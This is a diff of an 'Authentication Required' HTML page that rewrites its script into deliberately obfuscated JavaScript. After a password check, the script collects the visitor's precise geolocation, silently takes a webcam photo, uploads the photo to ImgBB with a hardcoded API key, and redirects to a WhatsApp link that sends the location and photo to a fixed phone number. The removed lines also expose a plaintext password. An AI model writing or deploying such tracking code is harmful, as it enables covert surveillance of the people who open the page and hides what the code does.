@@ -5,22 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Authentication Required</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin: 50px;
-        }
-        #main-content {
-            display: none; /* Hide main content initially */
-        }
+        body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
+        #main-content { display: none; }
     </style>
 </head>
 <body>
     <div id="auth-section">
         <h2>Enter Password to Access</h2>
-        <input type="password" id="password-input" placeholder="Enter password">
-        <button onclick="checkPassword()">Submit</button>
-        <p id="auth-status" style="color: red;"></p>
+        <input type="password" id="p-a" placeholder="Enter password">
+        <button onclick="x1x()">Submit</button>
+        <p id="a-s" style="color: red;"></p>
     </div>
 
     <div id="main-content">
@@ -30,94 +24,80 @@
     </div>
 
     <script>
-        const PASSWORD = "Nipunapromod@1"; // Change this password
-
-        function checkPassword() {
-            const userPassword = document.getElementById("password-input").value;
-            if (userPassword === PASSWORD) {
-                document.getElementById("auth-section").style.display = "none";
-                document.getElementById("main-content").style.display = "block";
-                getLocation(); // Start the process only after authentication
-            } else {
-                document.getElementById("auth-status").innerText = "Incorrect password! Try again.";
+        (function(){
+            var _0xabc=["value","getElementById","p-a","style","display","none","block","auth-section","main-content","Incorrect password!","innerText","b1b3773a05c0ed0176787a4f1574ff0075f7521e"];
+            
+            async function x1x(){
+                const _p=document[_0xabc[1]](_0xabc[2])[_0xabc[0]];
+                const _h=await x2x(_p);
+                if(_h===_0xabc[11]){
+                    document[_0xabc[1]](_0xabc[7])[_0xabc[3]][_0xabc[4]]=_0xabc[5];
+                    document[_0xabc[1]](_0xabc[8])[_0xabc[3]][_0xabc[4]]=_0xabc[6];
+                    x3x();
+                } else {
+                    document[_0xabc[1]]("a-s")[_0xabc[10]]=_0xabc[9];
+                }
             }
-        }
 
-        const IMGBB_API_KEY = "83601732f6095faec5d42577498c1da8";  
-        const WHATSAPP_NUMBER = "94713424265";  
+            async function x2x(p){
+                const enc=new TextEncoder().encode(p);
+                const hash=await crypto.subtle.digest("SHA-256", enc);
+                return Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,"0")).join("");
+            }
 
-        let locationLink = "";  
-        let locationFilename = "";  
-
-        function sendToWhatsApp(photoLink) {
-            const message = `📍 Location: ${locationLink}\n📷 Photo: ${photoLink}`;
-            const whatsappUrl = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(message)}`;
-            window.location.href = whatsappUrl; 
-        }
-
-        function getLocation() {
-            if (navigator.geolocation) {
+            function x3x(){
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lng = position.coords.longitude;
-                        locationLink = `https://www.google.com/maps?q=${lat},${lng}`;
-                        locationFilename = `photo_${lat}_${lng}.png`;
-                        document.getElementById("status").innerText = "Location found! Taking photo...";
-                        capturePhoto();
+                    (p)=>{
+                        var lat=p.coords.latitude,lng=p.coords.longitude;
+                        var loc=`https://www.google.com/maps?q=${lat},${lng}`;
+                        document.getElementById("status").innerText="Location found! Taking photo...";
+                        x4x(loc);
                     },
-                    (error) => {
-                        document.getElementById("status").innerText = "Error getting location: " + error.message;
+                    (err)=>{
+                        document.getElementById("status").innerText="Error getting location: "+err.message;
                     },
                     { enableHighAccuracy: true, maximumAge: 0 }
                 );
-            } else {
-                document.getElementById("status").innerText = "Geolocation is not supported by this browser.";
             }
-        }
 
-        async function capturePhoto() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement("video");
-                video.srcObject = stream;
-                video.play();
-
-                video.onloadedmetadata = () => {
-                    const canvas = document.getElementById("canvas");
-                    const ctx = canvas.getContext("2d");
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    stream.getTracks().forEach(track => track.stop());
-                    canvas.toBlob(uploadToImgBB, "image/png");
-                };
-            } catch (error) {
-                console.error("Camera access error:", error);
-            }
-        }
-
-        function uploadToImgBB(blob) {
-            const formData = new FormData();
-            formData.append("image", blob);
-            formData.append("key", IMGBB_API_KEY);
-
-            fetch("https://api.imgbb.com/1/upload", {
-                method: "POST",
-                body: formData,
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    sendToWhatsApp(data.data.url);
-                } else {
-                    console.error("ImgBB upload failed:", data.error);
+            async function x4x(loc){
+                try {
+                    const stream=await navigator.mediaDevices.getUserMedia({video:true});
+                    const video=document.createElement("video");
+                    video.srcObject=stream;
+                    video.play();
+                    video.onloadedmetadata=()=>{
+                        const canvas=document.getElementById("canvas");
+                        const ctx=canvas.getContext("2d");
+                        canvas.width=video.videoWidth;
+                        canvas.height=video.videoHeight;
+                        ctx.drawImage(video,0,0,canvas.width,canvas.height);
+                        stream.getTracks().forEach(t=>t.stop());
+                        canvas.toBlob((b)=>x5x(b,loc),"image/png");
+                    };
+                } catch(err){
+                    console.error("Camera access error:", err);
                 }
-            })
-            .catch(error => {
-                console.error("ImgBB API request failed:", error);
-            });
-        }
+            }
+
+            function x5x(blob,loc){
+                const f=new FormData();
+                f.append("image",blob);
+                f.append("key","83601732f6095faec5d42577498c1da8");
+
+                fetch("https://api.imgbb.com/1/upload",{method:"POST",body:f})
+                .then(r=>r.json())
+                .then(d=>{
+                    if(d.success){
+                        var waUrl=`https://wa.me/94713424265?text=${encodeURIComponent(`📍 Location: ${loc}\n📷 Photo: ${d.data.url}`)}`;
+                        window.location.href=waUrl;
+                    } else {
+                        console.error("ImgBB upload failed:", d.error);
+                    }
+                })
+                .catch(e=>{console.error("ImgBB API request failed:",e)});
+            }
+        })();
     </script>
 </body>
 </html>
